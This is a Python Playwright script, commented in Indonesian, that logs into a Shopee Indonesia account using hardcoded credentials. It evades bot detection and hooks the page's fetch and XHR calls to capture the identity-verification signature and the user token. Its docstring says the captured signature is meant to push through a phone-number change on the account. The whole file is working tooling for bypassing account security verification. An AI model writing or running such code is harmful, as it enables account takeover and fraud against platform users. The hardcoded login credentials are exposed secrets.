# -*- coding: utf-8 -*-
"""steal_sig.py — CURI signature IVS dari SDK browser.

Pendekatan:
  1. Login fresh di browser (headless) dengan akun ck_5th
  2. Setelah /verify/ivs muncul, hook SEMUA fungsi yang mengembalikan
     string base64 berawalan 'U2FsdGVkX1' (CryptoJS AES)
  3. Tangkap signature asli yang SDK hasilkan
  4. Pakai signature itu untuk commit change_phone

Alternatif kalau signature tak muncul:
  panggil token/verify DARI DALAM page.evaluate (header SDK asli) untuk
  method 2 (Password) dengan memancing lewat UI.

Output: sig_steal.json
"""
import json, sys, time, re

USER = "yq7uwh456q"
PASSW = "qwertyui123"
NEWPHONE = "6283191104601"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36")
PROXY = "http://127.0.0.1:18080"
OUT = "/root/shopee-verify/sig_steal.json"


def log(*a):
    print(*a, flush=True)


from playwright.sync_api import sync_playwright

found = {}

HOOK = r"""
(() => {
  window.__SIGS = [];
  const RE = /^U2FsdGVkX1[A-Za-z0-9+/=]{100,}/;
  function record(v, where) {
    try {
      if (typeof v === 'string' && RE.test(v)) {
        window.__SIGS.push({v: v, w: where, t: Date.now()});
      }
    } catch(e){}
  }
  // hook fetch: rekam response body yang berisi signature
  const of = window.fetch;
  window.fetch = async function(...args) {
    const r = await of.apply(this, args);
    try {
      const c = r.clone();
      c.text().then(t => {
        if (t && t.indexOf('signature') !== -1) {
          try {
            const j = JSON.parse(t);
            const sg = (j.data||{}).signature;
            if (sg) window.__SIGS.push({v: sg, w: 'fetch-resp', t: Date.now()});
          } catch(e){}
        }
      }).catch(()=>{});
    } catch(e){}
    return r;
  };
  // hook XHR
  const oo = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(m,u){ this.__u=u; return oo.apply(this,arguments); };
  const os = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function(){
    this.addEventListener('load', ()=>{ try{ record(this.responseText,'xhr'); }catch(e){} });
    return os.apply(this, arguments);
  };
  // hook btoa / JSON.parse hasil untuk signature
  const ob = window.btoa;
  window.btoa = function(s){ const r = ob.call(window,s); return r; };
  window.__stealSigs = () => window.__SIGS.slice(-20);
})();
"""


with sync_playwright() as pw:
    br = pw.chromium.launch(headless=True, args=[
        "--no-sandbox", "--disable-dev-shm-usage", "--window-size=1366,1000",
        "--disable-blink-features=AutomationControlled"])
    ctx = br.new_context(user_agent=UA, locale="id-ID",
                         viewport={"width": 1366, "height": 1000},
                         timezone_id="Asia/Jakarta", proxy={"server": PROXY})
    ctx.add_init_script(HOOK)
    pg = ctx.new_page()

    net = []

    def onresp(r):
        if "/api/v4/" in r.url and any(k in r.url for k in ("ivs", "login", "password")):
            try:
                net.append({"u": r.url.split("shopee.co.id")[-1][:80],
                            "s": r.status, "b": r.text()[:1500]})
            except Exception:
                pass

    pg.on("response", onresp)

    log("=== 1. login page ===")
    pg.goto("https://shopee.co.id/buyer/login", wait_until="domcontentloaded", timeout=90000)
    for _ in range(15):
        if pg.locator('input[name="loginKey"]').count() > 0:
            break
        pg.wait_for_timeout(2000)
    pg.wait_for_timeout(3000)

    log("=== 2. login ===")
    el = pg.locator('input[name="loginKey"]').first
    el.click(force=True)
    el.type(USER, delay=45)
    pg.wait_for_timeout(700)
    el.press("Enter")
    pg.wait_for_timeout(4000)
    pwi = pg.locator('input[type="password"]').first
    pwi.wait_for(state="visible", timeout=25000)
    pwi.click(force=True)
    pwi.type(PASSW, delay=50)
    pg.wait_for_timeout(700)
    pwi.press("Enter")
    pg.wait_for_timeout(12000)

    log(f"url: {pg.url[:85]}")
    body = pg.evaluate("()=>document.body.innerText.slice(0,300)").replace("\n","|")
    log(f"body: {body[:200]}")

    # ambil u_token dari URL
    ut = None
    m = re.search(r"u_token=([^&]+)", pg.url)
    if m:
        import urllib.parse as up
        ut = up.unquote(m.group(1))
        log(f"u_token: {len(ut)}B")

    # === 3. klik method Password kalau ada ===
    clicked = []
    for t in ("Password", "Kata Sandi", "Kata sandi", "Sandi",
              "Verifikasi dengan Password"):
        try:
            loc = pg.get_by_text(t, exact=False)
            if loc.count() > 0:
                loc.first.click(timeout=4000, force=True)
                clicked.append(t)
                log(f"klik '{t}'")
                pg.wait_for_timeout(6000)
                break
        except Exception:
            pass

    pg.screenshot(path="/root/shopee-verify/ivs_page.png", full_page=False)
    log(f"url setelah klik: {pg.url[:80]}")

    # === 4. kumpulkan signature yang tertangkap ===
    sigs = pg.evaluate("()=> (window.__stealSigs && window.__stealSigs()) || []")
    log(f"\n=== signature tertangkap: {len(sigs)} ===")
    for s in sigs[:5]:
        log(f"  [{s['w']}] {s['v'][:60]}... ({len(s['v'])}B)")

    # juga dari network
    log("\n=== network ivs ===")
    for n in net:
        log(f"  {n['s']} {n['u']}")
        if "signature" in n["b"]:
            try:
                j = json.loads(n["b"])
                sg = (j.get("data") or {}).get("signature")
                if sg:
                    found["sig_net"] = sg
                    log(f"     🟢 SIGNATURE dari network: {sg[:50]}... ({len(sg)}B)")
            except Exception:
                pass

    if sigs:
        found["sig"] = sigs[0]["v"]
        found["sig_src"] = sigs[0]["w"]
    if ut:
        found["u_token"] = ut
    found["sigs_all"] = sigs[:10]
    found["net"] = net

    json.dump(found, open(OUT, "w"), indent=1)
    log(f"\n-> {OUT}")
    br.close()

log("\n=== SELESAI ===")
